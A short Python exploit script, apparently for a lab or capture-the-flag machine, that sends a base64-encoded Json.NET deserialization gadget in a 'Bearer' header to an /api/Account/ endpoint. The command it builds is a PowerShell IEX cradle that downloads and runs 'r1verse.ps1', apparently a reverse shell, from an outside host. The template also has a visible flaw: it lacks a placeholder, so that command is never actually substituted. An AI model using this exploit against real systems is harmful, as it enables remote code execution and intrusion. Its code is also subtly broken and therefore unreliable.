#!/usr/bin/env python3
import base64
import requests
from string import Template

box_ip = "10.10.10.158"

payloadTemplate = Template('''{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/c cmd']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}''')

print("[*] Invokes a command via .NET deserialization")
cmd = "powershell IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.15.161:8000/r1verse.ps1\')"
#print("Executing : " + cmd)
#cmd = cmd.replace("'", "\'")
#cmd = cmd.replace("\"", "\\\"")
#cmd = cmd.replace("\\", "\\\\")
payload = payloadTemplate.safe_substitute({'cmd': cmd})
payloadBase64 = str(base64.b64encode(payload.encode("utf-8")), "utf-8")

requests.get("http://" + box_ip + "/api/Account/", headers={
    "Bearer": payloadBase64
})

#print(str(base64.b64encode(payload), "utf-8"))
